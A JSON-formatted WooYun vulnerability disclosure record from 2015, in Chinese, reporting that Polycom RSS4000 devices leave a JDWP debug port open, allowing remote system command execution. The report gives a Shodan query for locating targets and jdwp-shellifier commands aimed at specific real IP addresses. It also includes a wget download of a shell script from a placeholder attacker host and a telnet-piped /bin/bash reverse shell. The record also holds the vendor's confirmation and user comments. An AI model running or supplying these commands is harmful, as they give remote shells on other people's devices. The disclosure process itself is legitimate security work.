{"id": 41862, "wybug_id": "wooyun-2015-095744", "wybug_title": "polycom（宝利通）RSS4000默认开启jdwp端口导致系统命令执行", "wybug_corp": "polycom", "wybug_author": "f4ckbaidu", "wybug_date": "2015-02-05 13:27", "wybug_open_date": "2015-05-11 09:04", "wybug_type": "默认配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-11：\t细节向公众公开  简要描述： shodan上抓了几十个开放jdwp端口的ip，全是polycom RSS4000，估计是通用型了 详细说明：  https://www.shodan.io/search?query=JDWP-HANDSHAKE搜了几十个IP，这些IP的23、80、443、8000端口特征几乎一样，如下图：\n\n8000端口都可以利用以下工具执行系统命令：https://github.com/IOActive/jdwp-shellifier用法如下，记得要触发java.net.ServerSocket.accept才能成功（需要访问他们的80或者443端口）\n./jdwp-exp.py -t IP -p 端口 --cmd '系统命令'\n系统信息都一模一样：\n\n\n\n\n\n均可执行系统命令：\n./jdwp-exp.py -t 96.4.97.145 -p 8000 --cmd 'telnet x.x.x.x 3333'./jdwp-exp.py -t 208.87.76.78 -p 8000 --cmd 'telnet x.x.x.x 3333'\n\n\n   漏洞证明：  增加利用telnet反弹得到shell的方法，以国内某设备为例\n./jdwp-exp.py -t 221.123.167.230 -p 8000 --cmd 'wget http://x.x.x.x:2222/shell.txt -O /tmp/shell.sh'./jdwp-exp.py -t 221.123.167.230 -p 8000 --cmd 'chmod a+x /tmp/shell.sh'./jdwp-exp.py -t 221.123.167.230 -p 8000 --cmd '/tmp/shell.sh'\nshell.txt内容：（需要开2个端口，一个用于发送命令一个用于接受命令返回）\ntelnet x.x.x.x 1111 | /bin/bash | telnet x.x.x.x 3333\n1111端口用来发送命令，3333接受命令返回\n\nhttps://221.123.167.230/wooyun.html\n\n   修复方案：     版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-10 09:02 厂商回复： CNVD确认并复现所述情况，针对已经公开漏洞信息，已经由CNVD向设备生产厂商通报，由其后续提供解决方案 。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-05 21:49 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @疯狗 @xsser @finger，已重新编辑添加具体利用方法，请审核！谢谢    \n     2015-02-05 22:06 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @浩天 已重新编辑添加具体利用方法，请审核！谢谢    \n     2015-02-08 11:31 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @cncert国家互联网应急中心版本全部都是Version: 7.0.0.0 rev 30619  Build time: 09/28/11  19:33:55    \n     2015-05-12 09:41 |    \t\thack_lan \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 爱好linux开源架构，安全，python)\t\t \n  楼主那个扫描是用什么扫描的 看起来不错哦求名称    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}